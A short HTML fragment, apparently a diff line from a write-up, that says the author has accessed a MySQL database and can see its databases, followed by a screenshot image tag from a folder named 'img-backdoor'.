+&lt;p&gt;And we access on the myslq database, and here we can see the databases that are created.&lt;/p&gt;
 
 &lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/img-backdoor/captura43.png&quot; /&gt;
